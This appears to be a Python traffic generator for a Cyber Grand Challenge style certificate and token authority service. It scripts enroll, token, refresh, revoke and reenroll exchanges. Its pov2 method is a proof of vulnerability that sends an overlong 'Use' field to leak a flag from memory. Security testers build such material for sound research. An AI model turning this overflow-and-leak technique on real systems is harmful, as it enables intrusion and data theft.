#!/usr/bin/env python
#
# Copyright (C) 2015 Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#

from generator.actions import Actions, Variable
import string
import random
import itertools
import math
from struct import *
import pdb

class TemplateGenerator(Actions):

	def _getToken(self):
		requestBits = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]
		token = 1

		for c in range(10):
			if(ord(self.magic_page[self.magic_idx+c]) % requestBits[c] == 0):
				token = token * requestBits[c]

		self.magic_idx += 10

		while (token < 10000000):
			token = token * 10

		while (token > 99999999):
			token = token / 10

 		return str(token)

	def start(self): 
		#self.delay(100)
		self.magic_idx = 0
		reg_ex = '(.*)\?'
		certificate = Variable('certificate')
		certificate.set_re(reg_ex, group=1)
		self.state['certificate'] = certificate
		self.state['token'] = ''
		revoked_token = Variable('revokedToken')
		revoked_token.set_re(reg_ex, group=1)
		self.state['revoked_token'] = revoked_token
		revoked_cert = Variable('revokedCert')
		revoked_cert.set_re(reg_ex, group=1)
		self.state['revoked_cert'] = revoked_cert
		issuer = Variable('issuer')
		reg_ex = "Issuer=(.*);"
		issuer.set_re(reg_ex, group=1)
		self.state['issuer'] = issuer
		signature = Variable('signature')
		self.state['signature'] = signature
		expiration = Variable('expiration')
		self.state['expiration'] = expiration
		self.id = random.randint(1,10000)
		pass

	def enrollCert(self):
		command = "enroll"
		auth_type = "PeerCert"
		self.id += 1
		id_str =  str(self.id) 
		subject =  ''.join(random.choice(string.ascii_letters + " ") for _ in range(20)) 
		key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(9)) 
		use = "enroll:reenroll:crls"
		certificate = "Subject=" + subject + ";Key=" + key + ";Use=" + use
		body = certificate
		message1 = command + "," + auth_type + "," + id_str + ","
		message2 = "," + body + "!"
		issuer_hdr = "Issuer="
		subject_hdr = ";Subject="
		key_hdr = ";Key="
		signature_hdr = ";Signature="
		expiration_hdr = ";Expiration="
		use_hdr = ";Use="
		self.write(message1)
		self.write(issuer_hdr)
		self.write(self.state['issuer'])
		self.write(subject_hdr)
		self.write(self.state['subject'])
		self.write(key_hdr)
		self.write(self.state['key'])
		self.write(signature_hdr)
		self.write(self.state['signature'])
		self.write(expiration_hdr)
		self.write(self.state['expiration'])
		self.write(use_hdr)
		self.write(self.state['certUse'])
		self.write(message2)
		self.read(delim=";", assign=self.state['issuer'])
		self.state['subject'] = subject
		match = "Subject=" + subject + ";"
		self.read(delim=";", expect=match)
		self.state['key'] = key
		match = "Key=" + key + ";"
		self.read(delim=";", expect=match)
		reg_ex = "Signature=(.*);"
		self.state['signature'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['signature'])
		reg_ex = "Expiration=(.*);"
		self.state['expiration'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['expiration'])
		self.state['certUse'] = use
		match = "Use=" + use + "?"
		self.read(delim="?", expect=match)


	def requestTokenUP(self):
		command = "newTokens"
		auth_type = "UserPass"
		self.id += 1
		id_str =  str(self.id) 
		user = "user"
		password = "pass"
		credential = user + "/" + password
		use = "enroll:newTokens:refreshToken:revokeToken"
		body = "Use=" + use
		message = command + "," + auth_type + "," + id_str + "," + credential + "," + body + "!"
		self.write(message)
		self.state['token'] = self._getToken()
		token_re = "Token=" + self.state['token'] + ";Expiration=(.*);Use=enroll:newTokens:refreshToken:revokeToken?"
		self.read(delim="?", expect=token_re, expect_format='pcre')

	def requestTokenToken(self):
		command = "newTokens"
		auth_type = "Token"
		self.id += 1
		id_str =  str(self.id) 
		use = "enroll:newTokens:refreshToken:revokeToken"
		body = "Use=" + use
		message1 = command + "," + auth_type + "," + id_str + ",Token=" + self.state['token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message2 = "," + body + "!"
		self.write(message1)
		self.write(message2)
		self.state['token'] = self._getToken()
		token_re = "Token=" + self.state['token'] + ";Expiration=(.*);Use=enroll:newTokens:refreshToken:revokeToken?"
		self.read(delim="?", expect=token_re, expect_format='pcre')

	def refreshTokenToken(self):
		command = "refreshToken"
		auth_type = "Token"
		self.id += 1
		id_str =  str(self.id) 
		use = "enroll:newTokens:refreshToken:revokeToken"
		message1 = command + "," + auth_type + "," + id_str + ",Token=" + self.state['token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message2 = ","
		body = "Token=" + self.state['token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		self.write(message1)
		self.write(message2)
		self.write(body)
		self.write("!")
		token_re = "Token=" + self.state['token'] + ";Expiration=(.*);Use=enroll:newTokens:refreshToken:revokeToken?"
		self.read(delim="?", expect=token_re, expect_format='pcre')

	def revokeTokenToken(self):
		command = "newTokens"
		auth_type = "Token"
		self.id += 1
		id_str =  str(self.id) 
		use = "enroll:newTokens:refreshToken:revokeToken"
		body = "Use=" + use
		message1 = command + "," + auth_type + "," + id_str + ",Token=" + self.state['token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message2 = "," + body + "!"
		self.write(message1)
		self.write(message2)
		self.state['revoked_token'] = self._getToken()
		token_re = "Token=" + self.state['revoked_token'] + ";Expiration=(.*);Use=enroll:newTokens:refreshToken:revokeToken?"
		self.read(delim="?", expect=token_re, expect_format='pcre')
		command = "revokeT"
		auth_type = "Token"
		self.id += 1
		id_str =  str(self.id) 
		body = "Token=" + self.state['revoked_token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message1 = command + "," + auth_type + "," + id_str + ",Token=" + self.state['revoked_token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message2 = ","
		self.write(message1)
		self.write(message2)
		self.write(body)
		self.write("!")
		response = "Response=Token Revoked?"
		self.read(delim="?", expect=response)	

	def enrollToken(self):
		command = "enroll"
		auth_type = "Token"
		self.id += 1
		id_str =  str(self.id) 
		subject =  ''.join(random.choice(string.ascii_letters + " ") for _ in range(20)) 
		key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(9)) 
		use = "enroll:reenroll:crls"
		certificate = "Subject=" + subject + ";Key=" + key + ";Use=" + use
		body = certificate
		message1 = command + "," + auth_type + "," + id_str + ",Token=" + self.state['token'] + ";Expiration=100;Use=enroll:newTokens:refreshToken:revokeToken"
		message2 = "," + body + "!"
		self.write(message1)
		self.write(message2)
		self.read(delim=";", assign=self.state['issuer'])
		self.state['subject'] = subject
		match = "Subject=" + subject + ";"
		self.read(delim=";", expect=match)
		self.state['key'] = key
		match = "Key=" + key + ";"
		self.read(delim=";", expect=match)
		reg_ex = "Signature=(.*);"
		self.state['signature'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['signature'])
		reg_ex = "Expiration=(.*);"
		self.state['expiration'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['expiration'])
		self.state['certUse'] = use
		match = "Use=" + use + "?"
		self.read(delim="?", expect=match)

	def reenrollCert(self):
		command = "reenroll"
		auth_type = "PeerCert"
		self.id += 1
		id_str =  str(self.id) 
		message1 = command + "," + auth_type + "," + id_str + ","
		message2 = ","
		self.write(message1)
		issuer_hdr = "Issuer="
		subject_hdr = ";Subject="
		key_hdr = ";Key="
		signature_hdr = ";Signature="
		expiration_hdr = ";Expiration="
		use_hdr = ";Use="
		self.write(issuer_hdr)
		self.write(self.state['issuer'])
		self.write(subject_hdr)
		self.write(self.state['subject'])
		self.write(key_hdr)
		self.write(self.state['key'])
		self.write(signature_hdr)
		self.write(self.state['signature'])
		self.write(expiration_hdr)
		self.write(self.state['expiration'])
		self.write(use_hdr)
		self.write(self.state['certUse'])
		self.write(message2)
		self.write(issuer_hdr)
		self.write(self.state['issuer'])
		self.write(subject_hdr)
		self.write(self.state['subject'])
		self.write(key_hdr)
		self.write(self.state['key'])
		self.write(signature_hdr)
		self.write(self.state['signature'])
		self.write(expiration_hdr)
		self.write(self.state['expiration'])
		self.write(use_hdr)
		self.write(self.state['certUse'])
		self.write("!")
		self.read(delim=";", assign=self.state['issuer'])
		subject = self.state['subject']
		match = "Subject=" + subject + ";"
		self.read(delim=";", expect=match)
		key = self.state['key']
		match = "Key=" + key + ";"
		self.read(delim=";", expect=match)
		reg_ex = "Signature=(.*);"
		self.state['signature'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['signature'])
		reg_ex = "Expiration=(.*);"
		self.state['expiration'].set_re(reg_ex, group=1)
		self.read(delim=";", assign=self.state['expiration'])
		use = self.state['certUse']
		match = "Use=" + use + "?"
		self.read(delim="?", expect=match)

	def revokeCert(self):
		command = "enroll"
		auth_type = "PeerCert"
		self.id += 1
		id_str =  str(self.id) 
		subject =  ''.join(random.choice(string.ascii_letters + " ") for _ in range(20)) 
		key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(9)) 
		use = "enroll:reenroll:crls"
		certificate = "Subject=" + subject + ";Key=" + key + ";Use=" + use
		body = certificate
		message1 = command + "," + auth_type + "," + id_str + ","
		message2 = "," + body + "!"
		self.write(message1)
		issuer_hdr = "Issuer="
		subject_hdr = ";Subject="
		key_hdr = ";Key="
		signature_hdr = ";Signature="
		expiration_hdr = ";Expiration="
		use_hdr = ";Use="
		self.write(issuer_hdr)
		self.write(self.state['issuer'])
		self.write(subject_hdr)
		self.write(self.state['subject'])
		self.write(key_hdr)
		self.write(self.state['key'])
		self.write(signature_hdr)
		self.write(self.state['signature'])
		self.write(expiration_hdr)
		self.write(self.state['expiration'])
		self.write(use_hdr)
		self.write(self.state['certUse'])
		self.write(message2)
		self.read(delim="?", assign=self.state['revoked_cert'])
		command = "revoke"
		auth_type = "PeerCert"
		self.id += 1
		id_str =  str(self.id) 
		body = self.state['revoked_cert']
		message1 = command + "," + auth_type + "," + id_str + ","
		message2 = ","
		self.write(message1)
		self.write(self.state['revoked_cert'])
		self.write(message2)
		self.write(body)
		self.write("!")
		self.read(delim="?", assign=self.state['revoked_cert'])

	def pov2(self):
		command = "newTokens"
		auth_type = "UserPass"
		id_str =  "4175" #str(self.id) 
		user = "user"
		password = "pass"
		credential = user + "/" + password
		payload = "AAAABBBBCCCCDDDDAAAABBBBCCCCD"
		body = "Use=" + payload
		message = command + "," + auth_type + "," + id_str + "," + credential + "," + body + "!"
		self.write(message)
		flag_re = r'Token=[0-9]{8};Expiration=[0-9]*;Use=AAAABBBBCCCCDDDDAAAABBBBCCCCD\?(.*)'
		flag = Variable('flag')
		flag.set_re(flag_re, group=1)
		self.read(length=104, assign=flag)

	def quit(self):
		self.write("quit, , , !")
		return -1
